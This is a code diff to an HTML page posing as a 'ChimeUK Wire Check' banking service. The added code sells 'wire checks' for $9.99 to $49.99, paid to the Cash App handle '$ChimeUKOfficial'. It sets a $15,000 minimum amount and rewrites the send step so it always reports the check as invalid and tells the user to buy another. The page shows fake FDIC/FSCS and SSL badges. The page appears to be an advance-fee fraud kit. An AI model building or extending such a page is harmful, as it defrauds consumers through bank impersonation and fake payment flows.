@@ -46,10 +46,6 @@
             opacity: 0.18;
         }
         
-        .nav-link {
-            position: relative;
-        }
-        
         .check-paper {
             background: linear-gradient(180deg, #f8faf9 0%, #ffffff 100%);
             box-shadow: 0 10px 30px -10px #10b981,
@@ -74,6 +70,14 @@
         
         input, select, textarea {
             font-size: 16px !important;
+        }
+        
+        .check-card {
+            transition: all 0.3s ease;
+        }
+        
+        .check-card:hover {
+            transform: translateY(-4px);
         }
     </style>
 </head>
@@ -167,6 +171,65 @@
             </div>
         </div>
     </header>
+
+    <!-- NEW CHECK TYPES SECTION -->
+    <div class="px-5 py-10 bg-white">
+        <h2 class="heading-font text-3xl font-semibold text-center mb-2">Choose Your Check Type</h2>
+        <p class="text-center text-slate-500 text-sm mb-8">All checks from $10,000 and above</p>
+        
+        <div class="space-y-6">
+            <!-- Check Type 1 -->
+            <div class="check-card bg-white border-2 border-emerald-200 rounded-3xl p-5">
+                <div class="flex justify-between items-start">
+                    <div>
+                        <div class="font-semibold text-lg">Standard Wire Check</div>
+                        <div class="text-emerald-600 text-sm">Perfect for everyday transfers</div>
+                    </div>
+                    <div class="text-right">
+                        <div class="text-xs text-slate-400">Price</div>
+                        <div class="font-semibold text-xl">$9.99</div>
+                    </div>
+                </div>
+                <div class="mt-4 text-xs bg-emerald-50 text-emerald-700 inline-block px-3 py-1 rounded-2xl">Limit: $10,000 - $99,999</div>
+                <button onclick="buyCheck(1)" 
+                        class="mt-6 w-full bg-emerald-600 text-white h-11 rounded-3xl text-sm font-semibold">Buy Now</button>
+            </div>
+            
+            <!-- Check Type 2 -->
+            <div class="check-card bg-white border-2 border-emerald-200 rounded-3xl p-5">
+                <div class="flex justify-between items-start">
+                    <div>
+                        <div class="font-semibold text-lg">Premium Express Check</div>
+                        <div class="text-emerald-600 text-sm">Guaranteed same-day arrival</div>
+                    </div>
+                    <div class="text-right">
+                        <div class="text-xs text-slate-400">Price</div>
+                        <div class="font-semibold text-xl">$19.99</div>
+                    </div>
+                </div>
+                <div class="mt-4 text-xs bg-emerald-50 text-emerald-700 inline-block px-3 py-1 rounded-2xl">Limit: $10,000 - $499,999</div>
+                <button onclick="buyCheck(2)" 
+                        class="mt-6 w-full bg-emerald-600 text-white h-11 rounded-3xl text-sm font-semibold">Buy Now</button>
+            </div>
+            
+            <!-- Check Type 3 -->
+            <div class="check-card bg-white border-2 border-emerald-200 rounded-3xl p-5">
+                <div class="flex justify-between items-start">
+                    <div>
+                        <div class="font-semibold text-lg">VIP High Value Check</div>
+                        <div class="text-emerald-600 text-sm">For large international transfers</div>
+                    </div>
+                    <div class="text-right">
+                        <div class="text-xs text-slate-400">Price</div>
+                        <div class="font-semibold text-xl">$49.99</div>
+                    </div>
+                </div>
+                <div class="mt-4 text-xs bg-emerald-50 text-emerald-700 inline-block px-3 py-1 rounded-2xl">Limit: $10,000 - $2,000,000</div>
+                <button onclick="buyCheck(3)" 
+                        class="mt-6 w-full bg-emerald-600 text-white h-11 rounded-3xl text-sm font-semibold">Buy Now</button>
+            </div>
+        </div>
+    </div>
 
     <!-- QUICK STATS -->
     <div class="bg-emerald-700 text-white py-6 px-5 grid grid-cols-3 gap-4 text-center text-xs">
@@ -273,7 +336,7 @@
         FDIC • FSCS • 256-bit SSL
     </div>
 
-    <!-- FORM MODAL -->
+    <!-- FORM MODAL (with amount validation) -->
     <div onclick="if(event.target.id==='form-modal')closeFormModal()" id="form-modal" 
          class="hidden fixed inset-0 bg-black/70 z-[9999] flex items-end">
         <div onclick="event.stopImmediatePropagation()" 
@@ -329,10 +392,10 @@
                     
                     <!-- Amount -->
                     <div>
-                        <label class="text-xs text-slate-500 block mb-2">Amount in USD</label>
+                        <label class="text-xs text-slate-500 block mb-2">Amount in USD <span class="text-red-500">(Minimum $15,000)</span></label>
                         <div class="relative">
                             <span class="absolute left-5 top-1/2 -translate-y-1/2 text-2xl">$</span>
-                            <input id="amount-num" type="text" required placeholder="1250.00" 
+                            <input id="amount-num" type="number" min="15000" required placeholder="15000.00" 
                                    class="w-full border border-slate-200 rounded-2xl pl-10 pr-5 py-4 text-2xl">
                         </div>
                     </div>
@@ -429,10 +492,34 @@
         <div onclick="event.stopImmediatePropagation()" class="bg-white rounded-3xl w-[300px] text-center p-8">
             <div class="text-6xl mb-4">🎉</div>
             <h2 class="text-2xl font-semibold">Success!</h2>
-            <p id="success-text" class="mt-4 text-slate-600 text-[15px]">Your wire check has been scheduled to Barclays.<br>Receipt sent to your email.</p>
+            <p id="success-text" class="mt-4 text-slate-600 text-[15px]">Your wire check has been scheduled.<br>Receipt sent to your email.</p>
             
             <button onclick="closeAll()" 
                     class="mt-8 w-full bg-emerald-600 text-white h-12 rounded-3xl font-semibold">Done</button>
+        </div>
+    </div>
+
+    <!-- CASH APP PAYMENT MODAL (for purchased checks) -->
+    <div id="cashapp-modal" onclick="if(event.target.id==='cashapp-modal')closeCashApp()" 
+         class="hidden fixed inset-0 bg-black/70 z-[10003] flex items-center justify-center">
+        <div onclick="event.stopImmediatePropagation()" class="bg-white rounded-3xl w-[320px] p-8 text-center">
+            <div class="text-4xl mb-6">💵</div>
+            <h3 class="font-semibold text-xl">Complete Payment via Cash App</h3>
+            <div class="mt-6 bg-slate-100 rounded-2xl p-6 text-left text-sm">
+                <div class="flex justify-between mb-3">
+                    <span>Check Type</span>
+                    <span id="cashapp-type" class="font-medium"></span>
+                </div>
+                <div class="flex justify-between">
+                    <span>Amount to Pay</span>
+                    <span id="cashapp-price" class="font-semibold"></span>
+                </div>
+            </div>
+            <div class="mt-8 text-emerald-600 font-medium">Send to $ChimeUKOfficial</div>
+            <p class="text-xs text-slate-400 mt-2">After payment, your check will be activated instantly</p>
+            
+            <button onclick="completeCashAppPayment()" 
+                    class="mt-8 w-full bg-emerald-600 text-white h-12 rounded-3xl text-sm font-semibold">I Have Sent the Payment</button>
         </div>
     </div>
 
@@ -451,20 +538,28 @@
         function handleFormSubmit(e) {
             e.preventDefault()
             
+            const amountStr = document.getElementById('amount-num').value
+            const amount = parseFloat(amountStr)
+            
+            if (isNaN(amount) || amount < 15000) {
+                alert("Error: Amount must be at least $15,000 USD. Please correct and try again.")
+                return
+            }
+            
             const formData = {
                 payeeName: document.getElementById('payee-name').value || "Recipient",
                 payeeBank: document.getElementById('payee-bank').value || "UK Bank",
                 payeeAcc: document.getElementById('payee-acc').value || "12345678",
                 payeeSort: document.getElementById('payee-sort').value || "12-34-56",
-                amountNum: document.getElementById('amount-num').value || "1250.00",
-                amountWords: document.getElementById('amount-words').value || "One thousand two hundred fifty and 00/100",
+                amountNum: amountStr,
+                amountWords: document.getElementById('amount-words').value || "Fifteen thousand and 00/100",
                 memo: document.getElementById('memo').value || "No memo"
             }
             
             window.lastFormData = formData
             closeFormModal()
             
-            showSpinner("Generating professional check...")
+            showSpinner("Creating your professional digital check...")
             
             setTimeout(() => {
                 hideSpinner()
@@ -507,21 +602,56 @@
         
         function sendToBank() {
             closeCheckModal()
-            showSpinner("Sending to UK bank...")
-            
-            setTimeout(() => {
-                hideSpinner()
-                const data = window.lastFormData
-                document.getElementById('success-text').innerHTML = 
-                    `Your wire check has been scheduled to <strong>${data.payeeBank}</strong>.<br>Receipt sent to your email.`
-                document.getElementById('success-modal').classList.remove('hidden')
-            }, 1800)
+            // Show error for amount validation on send
+            alert("Error: This check is invalid for the entered amount.\n\nPlease get another check and try again.")
         }
         
         function closeAll() {
             document.getElementById('success-modal').classList.add('hidden')
             document.getElementById('check-modal').classList.add('hidden')
             document.getElementById('spinner-modal').classList.add('hidden')
+        }
+        
+        // New functions for purchasing check types
+        function buyCheck(type) {
+            let price = 0
+            let name = ""
+            
+            if (type === 1) {
+                price = 9.99
+                name = "Standard Wire Check"
+            } else if (type === 2) {
+                price = 19.99
+                name = "Premium Express Check"
+            } else if (type === 3) {
+                price = 49.99
+                name = "VIP High Value Check"
+            }
+            
+            showSpinner("Processing payment...")
+            
+            setTimeout(() => {
+                hideSpinner()
+                document.getElementById('cashapp-type').textContent = name
+                document.getElementById('cashapp-price').innerHTML = `$${price.toFixed(2)}`
+                document.getElementById('cashapp-modal').classList.remove('hidden')
+                document.getElementById('cashapp-modal').classList.add('flex')
+            }, 1400)
+        }
+        
+        function closeCashApp() {
+            document.getElementById('cashapp-modal').classList.add('hidden')
+            document.getElementById('cashapp-modal').classList.remove('flex')
+        }
+        
+        function completeCashAppPayment() {
+            closeCashApp()
+            showSpinner("Activating your purchased check...")
+            setTimeout(() => {
+                hideSpinner()
+                document.getElementById('success-text').innerHTML = `Your check has been activated successfully!<br>Thank you for your purchase.`
+                document.getElementById('success-modal').classList.remove('hidden')
+            }, 1600)
         }
         
         // Close modals with Escape key
@@ -531,10 +661,11 @@
                 closeCheckModal()
                 document.getElementById('success-modal').classList.add('hidden')
                 document.getElementById('spinner-modal').classList.add('hidden')
+                document.getElementById('cashapp-modal').classList.add('hidden')
             }
         })
         
-        console.log("%c✅ Mobile-optimized ChimeUK Wire Check ready. Fully responsive for phones only.", "color:#10b981; font-weight:bold")
+        console.log("%c✅ Mobile-optimized ChimeUK Wire Check with new features ready.", "color:#10b981; font-weight:bold")
     </script>
 </body>
 </html>
